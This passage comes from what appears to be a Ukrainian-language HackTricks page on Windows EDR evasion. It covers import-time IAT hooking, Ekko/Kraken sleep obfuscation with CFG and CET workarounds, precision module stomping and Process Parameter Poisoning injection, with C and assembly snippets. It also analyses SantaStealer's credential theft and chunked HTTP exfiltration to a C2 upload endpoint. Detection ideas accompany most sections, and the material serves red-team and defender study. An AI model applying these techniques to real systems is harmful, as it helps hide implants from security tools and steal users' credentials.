- Поєднуйте це з техніками stack cutting/stack stitching, щоб потрапити в очікувані frames перед прологом API.

Operational integration
- Додавайте reflective loader на початок post‑ex DLLs, щоб PIC і hooks автоматично ініціалізувалися під час завантаження DLL.
- Використовуйте Aggressor script для реєстрації target APIs, щоб Beacon і BOFs прозоро отримували переваги того самого evasion path без змін коду.

Detection/DFIR considerations
- IAT integrity: entries, які вказують на non-image (heap/anon) addresses; періодична перевірка import pointers.
- Stack anomalies: return addresses, що не належать loaded images; різкі переходи до non-image PIC; непослідовна RtlUserThreadStart ancestry.
- Loader telemetry: внутрішньопроцесні записи до IAT, рання активність DllMain, що змінює import thunks, неочікувані RX regions, створені під час завантаження.
- Image-load evasion: якщо виконується hooking LoadLibrary*, відстежуйте підозрілі завантаження automation/clr assemblies, пов’язані з memory masking events.

Related building blocks and examples
- Reflective loaders, що виконують IAT patching під час завантаження (наприклад, TitanLdr, AceLdr)
- Memory masking hooks (наприклад, simplehook) і stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stubs (наприклад, Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via a resident PICO

Якщо ви контролюєте reflective loader, можна виконати hooking imports **під час** `ProcessImports()`, замінивши вказівник loader's `GetProcAddress` на custom resolver, який спочатку перевіряє hooks:

- Створіть **resident PICO** (persistent PIC object), який зберігається після звільнення transient loader PIC.
- Експортуйте функцію `setup_hooks()`, яка перезаписує import resolver loader'а (наприклад, `funcs.GetProcAddress = _GetProcAddress`).
- У `_GetProcAddress` пропускайте ordinal imports і використовуйте hash-based hook lookup на кшталт `__resolve_hook(ror13hash(name))`. Якщо hook існує, повертайте його; інакше передавайте виклик справжньому `GetProcAddress`.
- Реєструйте hook targets під час link time за допомогою записів Crystal Palace `addhook "MODULE$Func" "hook"`. Hook залишається дійсним, оскільки розташований усередині resident PICO.

Це забезпечує **import-time IAT redirection** без patching code section завантаженої DLL після завантаження.

### Forcing hookable imports when the target uses PEB-walking

Import-time hooks спрацьовують лише тоді, коли функція фактично присутня в IAT target'а. Якщо модуль розв’язує APIs через PEB-walk + hash (без import entry), примусово додайте справжній import, щоб шлях `ProcessImports()` loader'а його побачив:

- Замініть hashed export resolution (наприклад, `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) на пряме посилання на кшталт `&WaitForSingleObject`.
- Compiler створить IAT entry, що дасть змогу перехоплювати виклик, коли reflective loader розв’язує imports.

### Ekko-style sleep/idle obfuscation without patching `Sleep()`

Замість patching `Sleep` виконуйте hooking **фактичних wait/IPC primitives**, які використовує implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Для тривалих очікувань обгорніть виклик у Ekko-style obfuscation chain, яка шифрує in-memory image під час idle:

- Використовуйте `CreateTimerQueueTimer` для планування послідовності callbacks, які викликають `NtContinue` із підготовленими `CONTEXT` frames.
- Типовий chain (x64): встановити для image `PAGE_READWRITE` → виконати RC4 encryption через `advapi32!SystemFunction032` над усім mapped image → виконати blocking wait → виконати RC4 decryption → **відновити per-section permissions**, проходячи PE sections → подати signal про завершення.
- `RtlCaptureContext` надає template `CONTEXT`; клонувати його в кілька frames і встановити registers (`Rip/Rcx/Rdx/R8/R9`) для виклику кожного кроку.

Operational detail: повертайте “success” для тривалих waits (наприклад, `WAIT_OBJECT_0`), щоб caller продовжив виконання, поки image замаскований. Цей pattern приховує module від scanners під час idle windows і уникає класичної сигнатури “patched `Sleep()`”.

Detection ideas (telemetry-based)
- Сплески callbacks `CreateTimerQueueTimer`, що вказують на `NtContinue`.
- Використання `advapi32!SystemFunction032` для великих суміжних buffers розміром із image.
- `VirtualProtect` для великих діапазонів із подальшим custom per-section permission restoration.

### Runtime CFG registration for sleep-obfuscation gadgets

На CFG-enabled targets перший непрямий jump до mid-function gadget, такого як `jmp [rbx]` або `jmp rdi`, зазвичай призводить до аварійного завершення process із `STATUS_STACK_BUFFER_OVERRUN`, оскільки gadget відсутній у CFG metadata модуля. Щоб Ekko/Kraken-style chains працювали всередині hardened processes:

- Реєструйте кожен indirect destination, який використовується chain, через `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` і entries `CFG_CALL_TARGET_VALID`.
- Для addresses усередині loaded images (`ntdll`, `kernel32`, `advapi32`) `MEMORY_RANGE_ENTRY` має починатися з **image base** і охоплювати **повний розмір image**.
- Для manually mapped/PIC/stomped regions використовуйте **allocation base** і замість цього розмір allocation.
- Позначайте не лише dispatch gadget, а й exports, до яких досягають опосередковано (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls), а також будь-які attacker-controlled executable sections, що стануть indirect targets.

Це перетворює sleep chains у стилі ROP/JOP із “працює лише в non-CFG processes” на reusable primitive для `explorer.exe`, browsers, `svchost.exe` та інших endpoints, скомпільованих із `/guard:cf`.

### CET-safe stack spoofing for sleeping threads

Повна заміна `CONTEXT` є помітною та може не працювати в CET Shadow Stack systems, оскільки spoofed `Rip` все одно має узгоджуватися з hardware shadow stack. Безпечніший pattern для sleep-masking:

- Виберіть інший thread у тому самому process і прочитайте його `NT_TIB` / TEB stack bounds (`StackBase`, `StackLimit`) через `NtQueryInformationThread`.
- Створіть backup справжнього TEB/TIB поточного thread.
- Захопіть справжній sleeping context через `GetThreadContext`.
- Скопіюйте **лише** справжній `Rip` у spoof context, залишивши spoofed `Rsp`/stack state без змін.
- Протягом sleep window скопіюйте `NT_TIB` spoof thread у TEB поточного thread, щоб stack walkers розгортали стек у межах legitimate stack range.
- Після завершення wait відновіть оригінальні TIB і thread context.

Це зберігає CET-consistent instruction pointer, водночас вводячи в оману EDR stack walkers, які довіряють TEB stack metadata для перевірки unwinds.

### APC-based alternative: Kraken Mask

Якщо timer-queue dispatch має надто помітну signature, ту саму sleep-encrypt-spoof-restore sequence можна виконати з suspended helper thread через queued APCs:

- Створіть helper thread із `NtTestAlert` як entrypoint.
- Поставте в queue підготовлені `CONTEXT` frames/APCs через `NtQueueApcThread` і вивільняйте їх через `NtAlertResumeThread`.
- Зберігайте chain state у heap, а не в helper stack, щоб не вичерпати стандартний 64 KB thread stack.
- Використовуйте `NtSignalAndWaitForSingleObject`, щоб атомарно подати signal для start event і перейти в block.
- Призупиніть main thread перед відновленням TIB/context (`NtSuspendThread` → restore → `NtResumeThread`), щоб зменшити race window, у якому scanner міг би виявити частково відновлений stack.

Це замінює signature `CreateTimerQueueTimer` + `NtContinue` на helper-thread/APC signature, зберігаючи ті самі цілі RC4 masking і stack-spoofing.

Additional detection ideas
- `NtSetInformationVirtualMemory` із `VmCfgCallTargetInformation` незадовго до sleeps, waits або APC dispatch.
- `GetThreadContext`/`SetThreadContext`, обгорнуті навколо `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` або `ConnectNamedPipe`.
- `NtQueryInformationThread`, після якого виконуються прямі записи в stack bounds TEB/TIB поточного thread.
- Chains `NtQueueApcThread`/`NtAlertResumeThread`, які опосередковано досягають `SystemFunction032`, `VirtualProtect` або helpers для section-permission restoration.
- Повторне використання коротких gadget signatures, таких як `FF 23` (`jmp [rbx]`) або `FF E7` (`jmp rdi`), як dispatch pivots усередині signed modules.


## Precision Module Stomping

Module stomping виконує payload із **`.text` section DLL, уже mapped усередині target process**, замість виділення очевидної private executable memory або завантаження нової sacrificial DLL. Target для overwrite має бути **loaded, disk-backed image**, чий code space може вмістити payload без пошкодження code paths, які process іще потребує.

### Reliable target selection

Naive stomping проти common modules, таких як `uxtheme.dll` або `comctl32.dll`, є ненадійним: DLL може бути не завантажена у remote process, а надто мала code region призведе до crash process. Надійніший workflow:

1. Перерахуйте modules target process і залиште **names-only include list** уже завантажених DLLs.
2. Спочатку зберіть payload і зафіксуйте його **точний розмір у bytes**.
3. Проскануйте candidate DLLs на диску та порівняйте PE section **`.text` `Misc_VirtualSize`** із розміром payload. Це важливіше за file size, оскільки відображає розмір executable section **після mapping у memory**.
4. Проаналізуйте **Export Address Table (EAT)** і виберіть RVA exported function як stomp start offset.
5. Розрахуйте **blast radius**: якщо payload перевищує boundary вибраної function, він перезапише сусідні exports, розташовані після неї в memory.

Typical recon/selection helpers seen in the wild:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Operational notes
- Надавайте перевагу DLL, які **вже завантажені** у віддалений процес, щоб уникнути telemetry від `LoadLibrary`/неочікуваних завантажень image.
- Надавайте перевагу exports, які цільовий застосунок виконує рідко; інакше звичайні code paths можуть звернутися до stomped bytes до або після створення thread.
- Великі implants часто потребують зміни embedding shellcode з string literal на **byte-array/braced initializer**, щоб повний buffer коректно представлявся у вихідному коді injector.

Detection ideas
- Віддалений запис у **image-backed executable pages** (`MEM_IMAGE`, `PAGE_EXECUTE*`) замість більш поширених private RWX/RX allocations.
- Точки входу exports, чиї in-memory bytes більше не збігаються з backing file на диску.
- Remote threads або context pivots, які починають виконання всередині legitimate DLL export, чиї перші bytes нещодавно було modified.
- Підозрілі послідовності `VirtualProtect(Ex)` / `WriteProcessMemory` щодо DLL `.text` pages, після яких створюється thread.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) — це техніка **process-injection / EDR-evasion**, яка уникає класичного remote write path (`VirtualAllocEx` + `WriteProcessMemory`). Замість копіювання bytes у вже запущений target вона використовує той факт, що Windows **копіює вибрані startup parameters `CreateProcessW` у child process** і зберігає їх усередині `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).

### Poisonable carriers copied by `CreateProcessW`

Корисні carriers:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (з `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Практичні обмеження carriers:

- `lpCommandLine` має вказувати на **writable memory** для `CreateProcessW` і обмежений **32,767 Unicode characters**, включно з null terminator.
- `lpEnvironment` має бути Unicode environment block із послідовних strings формату `NAME=VALUE\0`, завершених додатковим `\0`.
- `lpReserved` офіційно зарезервований, тому mapping до `ShellInfo` слід розглядати як implementation detail, а не стабільний documented contract.

Це перетворює звичайне створення процесу на **payload-transfer primitive**. Operator створює child process із attacker-controlled startup data і дозволяє Windows виконати cross-process copy.

### Remote lookup flow without remote write APIs

Після створення child process отримайте доступ до скопійованого buffer за допомогою **read-only** primitives:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → отримати `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Прочитати remote `PEB`
3. Перейти за `PEB.ProcessParameters`
4. Прочитати `RTL_USER_PROCESS_PARAMETERS`
5. Використати вибраний pointer:
- `parameters.CommandLine.Buffer`
- `parameters.Environment`
- `parameters.ShellInfo.Buffer`

Minimal flow:
```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```
### Виконання скопійованого буфера параметрів

Скопійована область параметрів зазвичай має права `RW`, а не є виконуваною. Типовий P3 chain:

1. Створити процес у звичайному режимі (не призупиненим)
2. Зробити вибрану сторінку параметрів виконуваною за допомогою `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Повторно використати дескриптор головного thread, уже повернутий у `PROCESS_INFORMATION`
4. Перенаправити виконання за допомогою `NtSetContextThread` (`CONTEXT_CONTROL`, перезаписати `RIP`)

На відміну від класичних workflow для thread hijacking, тут **не потрібні** `SuspendThread` / `ResumeThread`; контекст можна змінити безпосередньо через дескриптор повернутого головного thread.

Це дає змогу уникнути кількох API, які часто відстежуються під час injection:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- часто також `SuspendThread` / `ResumeThread`

### Обмеження нульових байтів і staged shellcode

Усі три carriers є **рядковими або подібними до рядкових даними**, тому raw payload, що містить `0x00`, обрізається під час передавання. Практичний спосіб обходу — **null-free first stage**, який відновлює константи під час виконання, а потім завантажує довільний second stage.

Простий шаблон — синтез констант на основі XOR:
```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```
Це дає змогу першому етапу створювати stack strings, аргументи API, шляхи до DLL або shellcode loader другого етапу без вбудовування null bytes у транспортований параметр.

### Stack-based API calls from the first stage

Коли першому етапу потрібно викликати такі API, як `LoadLibraryA`, він може:

- помістити рядок/буфер у stack цільового процесу
- зарезервувати **32-byte x64 shadow space**
- встановити `RCX`, `RDX`, `R8`, `R9` у константи або вказівники відносно `RSP`
- зберігати вирівнювання `RSP` на **16 bytes** перед викликом

Після цього другий етап можна скопіювати зі stack у виділену область `PAGE_READWRITE`, змінити її на `PAGE_EXECUTE_READ` за допомогою `VirtualProtect` і виконати перехід до неї, уникаючи прямого виділення RWX.

### Detection ideas

Авторами згадуються такі перспективні напрямки для hunting:

- `VirtualProtectEx` / `NtProtectVirtualMemory`, які роблять **process-parameter pages executable**
- зміна захисту, після якої викликається `SetThreadContext` / `NtSetContextThread`
- віддалене читання `PEB`, а потім `RTL_USER_PROCESS_PARAMETERS`
- незвично довгі значення або значення з високою ентропією в `lpCommandLine`, `lpEnvironment` чи `STARTUPINFO.lpReserved` під час створення процесу

### Notes

- P3 — це **cross-process transfer trick**, а не повноцінний execution primitive сам по собі: скопійованому параметру все одно потрібна зміна дозволу на виконання та метод перенаправлення виконання.
- `RtlCreateProcessReflection` / Dirty Vanity розглядалися авторами, але були відхилені, оскільки всередині вони звертаються до підозрілих primitives, таких як `NtWriteVirtualMemory` і `NtCreateThreadEx`.

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (також відомий як BluelineStealer) демонструє, як сучасні info-stealers поєднують AV bypass, anti-analysis і credential access в одному workflow.

### Keyboard layout gating & sandbox delay

- Прапорець конфігурації (`anti_cis`) перелічує встановлені keyboard layouts через `GetKeyboardLayoutList`. Якщо знайдено Cyrillic layout, sample створює порожній маркер `CIS` і завершує роботу до запуску stealers, гарантуючи, що він ніколи не detonates у виключених локалях, водночас залишаючи hunting artifact.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Багаторівнева логіка `check_antivm`

- Variant A проходить список процесів, хешує кожне ім’я за допомогою custom rolling checksum і порівнює його з вбудованими blocklist для debugger/sandbox; повторює checksum для імені комп’ютера та перевіряє робочі директорії, такі як `C:\analysis`.
- Variant B перевіряє системні властивості (мінімальну кількість процесів, нещодавній uptime), викликає `OpenServiceA("VBoxGuest")` для виявлення VirtualBox additions і виконує timing checks навколо sleep, щоб виявити single-stepping. Будь-який збіг перериває виконання до запуску модулів.

### Fileless helper + подвійне ChaCha20 reflective loading

- Основна DLL/EXE містить Chromium credential helper, який або записується на диск, або manually mapped у пам’ять; у fileless mode він самостійно розв’язує imports/relocations, тому артефакти helper не записуються.
- Цей helper зберігає DLL другого етапу, двічі зашифровану ChaCha20 (два 32-байтові ключі + 12-байтові nonce). Після обох проходів він reflectively loads blob (без `LoadLibrary`) і викликає exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, похідні від [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- Рутини ChromElevator використовують direct-syscall reflective process hollowing для injection у запущений Chromium browser, успадковують AppBound Encryption keys і розшифровують passwords/cookies/credit cards безпосередньо з SQLite databases, попри hardening ABE.


### Модульний збір у пам’яті та chunked HTTP exfil

- `create_memory_based_log` перебирає глобальну таблицю function-pointer `memory_generators` і створює по одному thread для кожного увімкненого модуля (Telegram, Discord, Steam, screenshots, documents, browser extensions тощо). Кожен thread записує результати у shared buffers і повідомляє кількість файлів після ~45-секундного join window.
- Після завершення все архівується статично зібраною бібліотекою `miniz` у `%TEMP%\\Log.zip`. Потім `ThreadPayload1` очікує 15 секунд і передає архів chunks по 10 МБ через HTTP POST на `http://<C2>:6767/upload`, маскуючи browser multipart/form-data boundary (`----WebKitFormBoundary***`). Кожен chunk додає `User-Agent: upload`, `auth: <build_id>`, необов’язковий `w: <campaign_tag>`, а останній chunk додає `complete: true`, щоб C2 знав, що reassembly завершено.

## References

- [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)

{{#include ../banners/hacktricks-training.md}}
